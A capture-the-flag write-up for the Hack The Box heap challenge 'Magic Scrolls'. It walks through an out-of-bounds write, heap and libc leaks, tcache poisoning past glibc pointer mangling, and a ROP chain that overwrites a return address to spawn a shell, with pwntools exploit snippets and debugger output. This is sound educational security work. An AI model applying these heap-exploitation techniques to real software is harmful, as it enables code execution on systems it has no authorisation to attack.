
# Magic Scrolls - HTB Heap Challenge


## TL;DR

- Use an Out-of-Bounds write in `update_magic_numbers()` to corrupt the `spells` array and leak heap base address.
- Leverage the OOB write with our leak to create an arbitrary read primitive, leaking the base address of glibc and the stack.
- Use the leaks to achieve arbitrary free, then free a fake chunk in the heap to modify a third chunk's `tcache_entry->next`.
- Abuse the corrupted tcache to gain arbitrary write and overwrite the return address of the `create_spell()` function with a ROP chain, achieving code execution.

## Challenge Description

> Legends say that if magical numbers align in the right sequence, magic will happen.

Challenge Author(s): **artex** \
Files: [Hack The Box Platform](https://app.hackthebox.com/challenges/Magic%2520Scrolls) \
Category: **pwn**

## Enumeration
### Analyzing the source code

- We are given a binary with the following functions:
    1. `create_spell()`: Asks for (up to 0x1ff bytes) data and uses `malloc()` and `memcpy()` to store it safely inside the heap. Saves its pointer and length inside the arrays `spells` and `spell_len`.
    2. `set_favorite_spell()`: Asks for an index, and populates the variables `super_spell` (pointer to the spell chosen), `super_spell_len` (its length) and `super_spell_set` (the index of the spell).
    3. `remove_spell()`: Frees a chunk and removes it from the `spells` array, if it is our favorite spell, sets its length to 0. Does not clean the pointer from `super_spell`.
    4. `read_spell()`: Reads data from `super_spell` using `super_spell_len`.
    5. `update_magic_numbers()`: This function (safely) takes a long from input and modifies a `long` `magic_numbers[4]` array. If even indexes (0 and 2) are `NULL`, writes 1 null byte into `magic_numbers[power]`, and if odd indexes (1 and 3) are `NULL`, it writes the null byte to `magic_numbers[power + 1]`. If any of these are not true then the next calculations are made:
        - `magic_numbers[power] = magic_numbers[0] & magic_numbers[2]`
        - `magic_numbers[power + 1] = magic_numbers[1] & magic_numbers[3]`


## Solution

### Finding the vulnerability

- At first, we do not really know what is this `power` variable, but as soon as we peek into `main()`:

```c
[...]
printf("Enter magic charm\n> ");
read(0,buf,64);
if (!strcmp(buf,"Alohomora")) {
    power = 4;
}
[...]
```

- The magic charm is giving us _the power_ to Out-of-Bounds write into `magic_numbers[4]`! Lets use GDB to debug the binary and see what is after this array.

```console
pwndbg> x/6gx &magic_numbers 
0x5060 <magic_numbers>:         0x0000000000000000      0x0000000000000000
0x5070 <magic_numbers+16>:      0x0000000000000000      0x0000000000000000
0x5080 <spells>:                0x0000000000000000      0x0000000000000000
```

- Looking good, we can tamper the `spells` array, here is where all the allocated chunks addresses are stored. 
Before modifying the pointers, we must find a way to leak heap base so we can use our primitive to defeat ASLR.
- Lets take a look at the function `remove_spell()`

```c
void remove_spell(void)
{
  int idx;
  printf("Index: ");
  scanf("%d",&idx);
  if ((idx < 0) || (spell_count <= idx)) {
    puts("Invalid Index");
  }
  else {
    free(spells[idx]);
    spells[idx] = 0;
    spell_len[idx] = 0;
    if (idx == super_spell_idx) {
      super_spell_len = 0;
    }
    puts("Spell removed");
  }
  return;
}
```
- Looks like it is safely freeing the chunk, removing the pointer and its length from each array.

- There is an `if` block that checks if the index given is the favorite spell:

```c
    if (idx == super_spell_idx) {
      super_spell_len = 0;
    }
```
- It is zeroing out the length but **not** the pointer inside `super_spell`. Actually, once we set a spell as favorite, the program does not clear it at any point. If we look at `set_favorite_spell()` we can see there is a big mistake.

```c
void set_favorite_spell(void)
{
  if (super_spell_idx == -1) {
    [...]
  }
  else {
    super_spell = spells[super_spell_idx];
    puts("Favorite spell already set.");
  }
}
```

- If it was already set, it "refreshes" its value with the pointer located at `super_spell_idx` position inside the `spells` array. Given that we have control over 2 entries of this array, this can get dangerous very quickly. When a chunk is freed, its entry is cleared, but if we set another chunk as a favorite, it sets `super_spell` to the value of the old entry's index without any validation checks.

### Exploitation

- We created some helper methods at our exploit script to allocate, free, read, set favorite spell, and update magic numbers.

```python
def update_magic_numbers(idx: int, magic: int):
    # spells[0] = magic[0] & magic[2]
    # spells[1] = magic[1] & magic[3]
    io.sendlineafter(b'> ', i2b(1))
    io.sendlineafter(b'number: ', i2b(idx))
    io.sendlineafter(b'number: ', i2b(magic) )

def malloc(spell: bytes):
    io.sendlineafter(b'> ', i2b(2))
    io.send(spell)

def free(idx: int):
    io.sendlineafter(b'> ', i2b(3))
    io.sendlineafter(b'Index: ', i2b(idx))

def read_favorite():
    io.sendlineafter(b'> ', i2b(4))

def set_favorite(idx: int, set=True):
    io.sendlineafter(b'> ', i2b(5))
    if not set:
        io.sendlineafter(b'spell: ', i2b(idx))
```

- Our plan will be the following:
    1. Send the magic words at the start of the main function: `Alohomora`
    2. Allocate a small chunk, we need to leave space for a second chunk in the 0x200 region of the heap (we will see why after).
    3. Free the first one -> `free(spells[0])`
    4. Update magic numbers with 0 as our input, so we overwrite the first byte of `spells[1]` with a null byte, making it point to 0x200, instead of 0x2a0 like it was initially.
    5. Set `spells[1]` (now pointing to 0x200, with size = 0x100) as our favorite spell, and use `read_spell()` to read 0xf8 bytes from 0x200. This way we can leak the heap base address by reading the first quadword of the `spells[0]` chunk, this will have the first 5 bytes of the address. This is what we will call the **heap key**, we will explain later what this is, but for now its enough to know that it is the first 5 bytes of the heap address. With this leak we can now free any heap address of our choice. 

- When we allocate both spells the heap looks like this:

```console
pwndbg> vis
...
0x5600eac78290  0x0000000000000000      0x0000000000000051      ........Q.......
0x5600eac782a0  0x4141316b6e756863      0x4141414141414141      chunk1AAAAAAAAAA <- spells[0]
0x5600eac782b0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5600eac782c0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5600eac782d0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5600eac782e0  0x0a41414141414141      0x0000000000000101      AAAAAAA......... 
0x5600eac782f0  0x4141326b6e756863      0x4141414141414141      chunk2AAAAAAAAAA <- spells[1]
0x5600eac78300  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
...

pwndbg> x/2gx &spells
0x5600d6188080 <spells>:        0x00005600eac782a0      0x00005600eac782f0
```

> NOTE: The second chunk has size 0x101, because `malloc()` chunks' size need to be aligned with the page, so if we allocate a chunk with size 0xf8, it will create a chunk of size 0x100. In the challenge, this is what happens, the length stored inside `spell_len` is 0xf8.

- After freeing 

```console
pwndbg> x/2gx &spells
0x5600d6188080 <spells>:        0x0000000000000000      0x00005600eac782f0
```

- And after setting our favorite spell

```console
pwndbg> x/2gx &spells
0x5600d6188080 <spells>:        0x0000000000000000      0x00005600eac78200
```

- Now if we call `read_spell()` we will read 0xf8 bytes starting from 0x200.

```
 :-:\x00\x00\x00\x00\xe0\xa7\xd8U\x05\x00\x00\x00.7\xbd\xd60\xb8\xd2\xfeAAAAAAAAAAAAA....
```

- We read from 

```nasm
0x5600eac78200  0x0000000000000000      0x0000000000000000      ................ <- We start reading from here
0x5600eac78210  0x0000000000000000      0x0000000000000000      ................
0x5600eac78220  0x0000000000000000      0x0000000000000000      ................
0x5600eac78230  0x0000000000000000      0x0000000000000000      ................
0x5600eac78240  0x0000000000000000      0x0000000000000000      ................
0x5600eac78250  0x0000000000000000      0x0000000000000000      ................
0x5600eac78260  0x0000000000000000      0x0000000000000000      ................
0x5600eac78270  0x0000000000000000      0x0000000000000000      ................
0x5600eac78280  0x0000000000000000      0x0000000000000000      ................
0x5600eac78290  0x0000000000000000      0x0000000000000051      ........Q.......
0x5600eac782a0  0x00000005600eac78      0xfed2b830d6bd372e      ...U.....7..0...         <-- tcachebins[0x50][0/1]
0x5600eac782b0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5600eac782c0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5600eac782d0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5600eac782e0  0x0a41414141414141      0x0000000000000101      AAAAAAA.........
0x5600eac782f0  0x4141326b6e756863      0x4141414141414141      chunk2AAAAAAAAAA <- We stop reading at "chunk2AA"
0x5600eac78300  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5600eac78310  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
```

- With this leak we can now read any heap address with `read_spell()` or free it with `remove_spell()`!

- While the heap leak gives us powerful primitives, we can just use them inside the heap. So our next step should be to leak libc to defeat ASLR in order to exploit our _non-arbitrary_ read and _non-arbitrary_ free on any address on the system (effectively making them arbitrary). The way you would want to do this in many heap challenges is by reading the first quadword of the metadata of an unsortedbin chunk. 

> An unsortedbin is a doubly linked, circular list that holds free chunks of any size.
> Free chunks are linked directly into the head of an unsortedbin when their corresponding tcachebin is full or they are outside tcache size range (0x420 & above under default conditions). 

- We can't allocate a chunk larger than 0x200, so we have to fill the tcache by allocating 9 chunks and freeing 8. We allocate 9 instead of 8 to prevent consolidation of the last chunk with the top chunk.

```python
for i in range(9):
    malloc(b'a' * 0x87)
for i in range(2, 10):
    free(i)
```

- Now we can read its content by checking the offset of the unsortedbin chunk with GDB, and setting it as favorite with our OOB write and the heap leak we obtained before.

```python
def add_offset(key, off):
    return (key << 12) + off

def arb_read(addr):
    update_magic_numbers(2, 0xffffffffffffffff)
    update_magic_numbers(4, addr)
    set_favorite(1)
    read_favorite()
    io.recvuntil(b':::::-:')
    io.recvlines(2)
    return u64(io.recvline().split(b':-:')[1][:8])
```

- When the size >= 0x90 freed chunk is placed in the unsortedbin, `free()` writes the `main_arena` address at its fd (first quadword of the chunk). We can read this value to calculate glibc base.

- After defeating ASLR and leaking heap base, the next step is finding a powerful write primitive that leads us to code execution. So to recap at where we are now, this is what we have:
    - Arbitrary read (glibc base and heap leaked)
    - Arbitrary free 
    - Freedom to allocate & free chunks up to 0x200

- At this point, there is more than one way to get arbitrary write, but we will use **tcache poisoning** because for this case, it will be the most straightforward technique to use in order to achieve this primitive. 

- When a chunk gets freed, it is placed in its thread's tcache. Each `tcache_entry` has this structure:

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  struct tcache_perthread_struct *key; 
  // This is *not* the heap key we talked about before, it exists to prevent double frees
} tcache_entry;
```

- The tcache freelist is a singedly linked list, each entry has the field `next` that saves a pointer to the next item in the freelist. If we modify our `tcache_entry->next` pointer with an address of our choice, we can allocate a chunk of the same size and it will end up in an address we control. In this case we will use the return address of the function `create_spell()`. 

- In modern versions of glibc, there is a protection mechanism implemented into tcache: **pointer mangling**. Each ``tcache_entry->next`` pointer is modified by [this directive](https://elixir.bootlin.com/glibc/glibc-2.42.9000/source/malloc/malloc.c#L328).

```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

- The last chunk's next pointer in the tcache free list (``tcache_perthread_struct->entries``) is NULL, indicating it is the last, so with this protection if the chunk is located at 0x5600eac782a0, `tcache_entry->next = 0 ^ (0x5600eac782a0 >> 12)` -> `tcache_entry->next = 0x5600eac78`. This is why we could leak the heap base with only 1 freed chunk, in older versions of glibc we had to free 2 chunks instead of one, to populate `next` field. For our tcache poisoning attack later, we will need to mangle our pointer by XOR'ing the target address with our key.

- Because the stack address is not fixed to libc base, we need to leak it too. We will use `environ` to do this. In [this](https://nickgregory.me/post/2019/04/06/pivoting-around-memory/) post there is more information about how it works.

- With GDB we place a breakpoint at the end of `create_spell()` function and we check the offset from `environ` to the return address.

```console
pwndbg> x/gx $rsp
0x7fffffffdbd8: 0x0000555555555390
pwndbg> x/gx &environ
0x7ffff7fba320 <environ>:       0x00007fffffffdd68
pwndbg> x 0x00007fffffffdd68 - 0x7fffffffdbd8
0x190:  Cannot access memory at address 0x190
```

- So we just leak `environ` with the same technique we used before, and substract 0x190 from it to calculate the return address location.


### Arbitrary write

- Because now we can free any address we want, we will create a fake chunk inside a "real" chunk in the heap, free both, and modify the fake chunks `tcache_entry->next` pointer by allocating the real one and writing over it. The sizes we choose are 0xf0 for the real chunk and 0x81 for the fake chunk. The chunks are created with sizes that have not been used yet in the program to simplify the process, any sizes can work as long as the real chunk has space to send enough data to create a fake chunk.

```python
# FAKE CHUNK
payload = b'a' * 0x10
payload += flat(0, 0x81)
payload += b'A' * 0xc0
```

```nasm
0x55bb426bc8f0  0x0061616161616161      0x00000000000000f1      aaaaaaa.........
0x55bb426bc900  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x55bb426bc910  0x0000000000000000      0x0000000000000081      ................ 
0x55bb426bc920  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA <-- Fake chunk
0x55bb426bc930  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x55bb426bc940  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
```

- Now we free it with OOB write and `remove_spell()`

```nasm
0x564fc6267b50  0x0061616161616161      0x00000000000000f1      aaaaaaa.........
0x564fc6267b60  0x0000000564fc6267      0x3050663dd48ae799      gb.d........=fP0 <- tcachebins[0xf0][0/1]
0x564fc6267b70  0x0000000000000000      0x0000000000000081      ................
0x564fc6267b80  0x0000564aa2da1fe7      0x3050663dd48ae799      ....JV......=fP0 <- tcachebins[0x80][0/2]
0x564fc6267b90  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x564fc6267ba0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
```

- Don't forget to free an additional 0x80 sized chunk before this, so our chunk is not the only one in the free list and the pointer is actually pointing to something.

- If we allocate a 0xf0 chunk now we can modify the metadata of our fake chunk. We mangle `return_address - 0x8` because a chunk address **has** to be 16-byte aligned.

```python
needed_len = 0xe0
metadata_tampering = b'w' * 0x10
metadata_tampering += flat(0x0) + flat(0x81) # Fake chunk metadata
metadata_tampering += flat(mangle(HEAP_KEY, return_address-8)) + flat(0xdeadbeef) # Fake tcache_entry->next and tcache_entry->key (its ok as long as it is not NULL)
metadata_tampering += b'r' * (needed_len - len(metadata_tampering)) # Whatever bytes to fill our needed length so our 0xf0 chunk gets allocated
malloc(metadata_tampering) # malloc a 0xf0 chunk and write the data over our fake chunk
```

```nasm
0x563d16b5db50  0x0061616161616161      0x00000000000000f1      aaaaaaa.........
0x563d16b5db60  0x7777777777777777      0x7777777777777777      wwwwwwwwwwwwwwww
0x563d16b5db70  0x0000000000000000      0x0000000000000081      ................
0x563d16b5db80  0x00007ffbc7d9d62d      0x00000000deadbeef      -............... <- tcachebins[0x80][0/2]
0x563d16b5db90  0x7272727272727272      0x7272727272727272      rrrrrrrrrrrrrrrr
0x563d16b5dba0  0x7272727272727272      0x7272727272727272      rrrrrrrrrrrrrrrr
```

```console
pwndbg> bins
tcachebins
0x80 [  2]: 0x563d16b5db80 —▸ 0x7ffea408bd70 ◂— 0x7ff95be2fd6b
```

- As we can see the address is correctly modified, so if we allocate two 0x80 chunks, the second one will end up inside our return address. With this primitive we can do a lot of things, in this case we write a standard ROP chain to call `system("/bin/sh")`.

### Getting the flag
After executing our script we achieve code execution.

```console
kali@kali:$ python3 exp.py 
[*] HEAP_KEY            :   0x561046b4d
[*] main_arena leak     :   0x7f8981fe6ce0
[*] libc base           :   0x7f8981e13000
[*] return_address      :   0x7ffe18e9de48
Spell: $ id
uid=0(root) gid=0(root) groups=0(root)
```

You can download the full script [here](assets/solver.py) or the solver with [TLS Storage](pwn\urjc.ctf.course\tls.dtor.overwrite.gestorcuentas) Overwrite approach [here](assets/solver_tls.py)